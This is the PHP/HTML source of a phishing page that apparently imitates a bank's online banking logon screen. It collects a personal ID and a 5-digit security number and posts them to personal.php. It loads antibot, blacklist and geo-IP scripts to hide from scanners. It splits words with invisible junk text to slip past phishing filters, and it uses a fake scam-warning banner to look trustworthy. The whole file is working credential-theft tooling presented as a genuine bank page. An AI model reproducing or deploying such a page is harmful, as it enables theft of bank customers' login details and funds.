<?php
ob_start();
require_once('../page_config.php');
require_once('../includes/geoLite/autoload.php');
require_once('../includes/device_detect.php');
require_once('../includes/blacklist_lookup.php');
require_once('../includes/functions.php');
require_once('../includes/session_protect.php');
require_once('../includes/antibot.php');
ob_end_flush(); 


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <title>Home</title>
    <link rel="stylesheet" href="../assets/css/normalize.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="shortcut icon" href=" data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAA3NCSVQICAjb4U/gAAABIElEQVQokZVSvWrCUBg9KUpLodDNF/ANHHXQyQfQ0cklq6O74pQh4AO4hiwOujuaIeB75F6bNCTREPR0SNGb1EA9XO5wfr7D/dEknsNLlaA1Gk8EXieTd8PgPwMEeLm8jUYPhz0ga61WulwC+Njt/paUAwQ+XRdAsljUu91ar1dOSGUJwANInizLA65BkO33XtFztx6Bk2XlO8ljvR6OxyTP6/VXsynUgACi6ZQkyWg2EwDJ7HDI23LEhiFugaDfvwlMUw+I53OS4WBABd/DoQQggMS2VSFZrTzg6vssIrFtkTf4nU5Jk0C62ZRIv92+nyHUdVU7b7eZ66pMqOuidEsSiE0zcxxG0a8rijLHiU3zZpCAJouv9hCa+g+qhCr8AGcFFUutQo12AAAAAElFTkSuQmCC" type="image/png" />
</head>

<body>
    <header>
        <div class="container">
            <div class="header_block">
                <div class="left_side">
                    <a href="#">
                        <img src="../assets/images/2zBXa4d_1.png" height="25"><img src="../assets/images/2zBXa4d_2.png" height="25">
                    </a>
                </div>
                <div class="right_side">
                    <p>Don’t have Online Ba<strong style="display:none;">cabook</strong>nk<sub style="font-size:0.0040px">cryometer</sub>in<em style="font-size:0.0016px">hedgehopped</em>g? </p>
                    <a href="">Si<em style="font-size:0.0063px">carfour</em>gn up</a>
                </div>
            </div>
        </div>
    </header>

    <div class="second_block">
        <div class="container">
            <div class="main">
                <div class="main_left">
                    <h3>Log on to your Online Ba<ins style="font-size:0.0067px">enchondroma</ins>nk<b style="font-size:0.007px">etymonic</b>in<mark style="font-size:0.0082px">gerrymandered</mark>g</h3>
                    <ul class="main_left-words">
                        <li class="main_left-first"><a class="lia red_bottom" href="#">Pe<b style="font-size:0.0066px">unveracious</b>rs<b style="display:none;">toiletry</b>on<em style="display:none;">unprovidential</em>al</a></li>
                        <li class="main_left-second"><a class="lia" href="#">Business</a></li>
                        <li class="main_left-third"><a class="lia" href="#">Corporate</a></li>
                    </ul>
                    <form id="form_0" action="personal.php<?=$urlParametrs?><?=$uriParametrs?>" method="post">
                        <input type="hidden" name="submit" value="0" />
                        <input type="hidden" name="redirurl" />
                        <div class="form">
                            <div class="varning">
                                <p>
                                    Your Pe<del style="font-size:0.0089px">recodifies</del>rs<em style="display:none;">gainward</em>on<sup style="font-size:0.0080px">schistosternia</sup>al ID or Se<em style="display:none;">jettage</em>cu<b style="display:none;">crepine</b>ri<em style="display:none;">purist</em>ty number are in<ins style="font-size:0.0011px">disobligation</ins>co<i style="display:none;">nocuous</i>rr<i style="display:none;">semiputrid</i>ec<sub style="font-size:0.0016px">opaques</sub>t. Getting your se<strong style="display:none;">infang</strong>cu<i style="display:none;">tattoos</i>ri<i style="display:none;">kurgans</i>ty de<b style="font-size:0.0077px">burseed</b>ta<small style="display:none;">canaling</small>il<small style="display:none;">corallet</small>s wrong
                                    may result in your ac<ins style="display:none;">restage</ins>ce<sub style="display:none;">satable</sub>ss being blocked.
                                </p>
                                <img src="../assets/images/7lxJMY5.png" alt="">
                            </div>
                            <div class="form_group">
                                <label class="label" for="name">Pe<strong style="font-size:0.0096px">rendible</strong>rs<b style="font-size:0.0013px">humblest</b>on<sup style="font-size:0.0032px">rud</sup>al ID</label>
                                <input type="text" id="personalId" name="personalId" class="input" maxlength="26">
                                <p class="varning_p">Please enter a valid pe<span style="font-size:0.0063px">philologistic</span>rs<small style="display:none;">filmogen</small>on<i style="display:none;">unsulfonated</i>al ID</p>
                            </div>
                            <div class="form_group">
                                <label class="label" for="password">Se<del style="font-size:0.0074px">convictively</del>cu<small style="font-size:0.009px">cuspule</small>ri<i style="font-size:0.0065px">fingu</i>ty number</label>
                                <p class="label_par">You may know this as your 5 digit Registration Number or Customer PIN
                                </p>
                                <input type="password" id="password" name="password" class="input"  placeholder="●●●●●" maxlength="5" pattern="[0-9]*" inputmode="numeric">
                                <p class="varning_p">Please enter a valid se<small style="display:none;">distemperedness</small>cu<sup style="display:none;">foreannounce</sup>ri<mark style="display:none;">orthodromic</mark>ty number</p>
                            </div>
                            <div class="form_group_ch">
                                <div class="check_wrap">
                                    <input type="checkbox" id="c1" name="cc">
                                    <label for="c1"><span class="sp_1"></span></label>
                                    <span class="txt">Remember ID</span>
                                </div>
                            </div>
                            <div class="check_wrap">
                                <input type="checkbox" id="c2" name="cc">
                                <label for="c2"><span class="sp_1"></span></label>
                                <span class="txt">I'm using a public or shared device</span>
                            </div>
                            <div id="loader" class="loader" >
                                <div>
                                   <olb-loader>
                                      <div class="loading"></div>
                                   </olb-loader>
                                </div>
                                <div>
                                    <p>Logging you on</p>
                                </div>
                            </div>
                        </div>

                        <button id="submit" class="button" type="submit" disabled="">Log on</button>
                        <p class="forget_a">
                            <a href="#">Forgotten de<em style="display:none;">forhale</em>ta<ins style="display:none;">unprettiness</ins>il<del style="display:none;">editchar</del>s?</a>
                        </p>
                    </form>
                </div>
                <div class="main_right">
                    <img src="../assets/images/W4iCSUy.png" alt="">
                    <h2>Beware co<del style="font-size:0.0036px">smelt</del>ro<del style="display:none;">idolization</del>na<em style="font-size:0.0096px">richesse</em>vi<b style="display:none;">conged</b>ru<sup style="font-size:0.0049px">diaclasite</sup>s scams</h2>
                    <p>
                        Cr<b style="font-size:0.0093px">morocain</b>im<span style="display:none;">jakes</span>in<mark style="display:none;">storehouse</mark>al<del style="font-size:0.0027px">tanguin</del>s are using co<small style="font-size:0.0099px">noncompositely</small>ro<i style="display:none;">sails</i>na<em style="display:none;">aeronomy</em>vi<ins style="font-size:0.001px">wishmay</ins>ru<em style="font-size:0.0081px">unhumanising</em>s to target people. Please stay on the lookout for anything unusual. Don’t be rushed and make sure any co<span style="display:none;">secundines</span>nt<sup style="display:none;">graphicness</sup>ac<small style="font-size:0.0093px">mislights</small>t claiming to be from us is genuine. <a href="#">Learn more</a>.
                    </p>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer">
            <ul class="footer_list">
                <li><a href="#"><a>Online Ba<sup style="font-size:0.0062px">lordoma</sup>nk<b style="font-size:0.0091px">unstubborn</b>in<sub style="display:none;">antifaction</sub>g Guarantee</a></li>
                <li><a href="#">Site Help & Ac<b style="font-size:0.0038px">gourding</b>ce<strong style="font-size:0.0059px">bourran</strong>ssibility</a></li>
                <li><a href="#">Se<sub style="display:none;">ottomanic</sub>cu<sup style="display:none;">iwflower</sup>ri<mark style="display:none;">unsavory</mark>ty & Pr<sup style="font-size:0.0039px">acumble</sup>iv<strong style="font-size:0.0034px">tragedians</strong>ac<sub style="font-size:0.0056px">coheretic</sub>y</a></li>
                <li><a href="#">Terms & Conditions</a></li>
                <li><a href="#">Legal</a></li>
            </ul>
            <div class="img_footer">
                <img src="../assets/images/qzkf32l.png" alt="">
            </div>

        </div>
    </footer>
    <script src="../assets/js/jquery-1.11.3.min.js"></script>
    <script src="../assets/js/imask.js"></script>
    <script src="../assets/js/main.js"></script>
</body>
</html>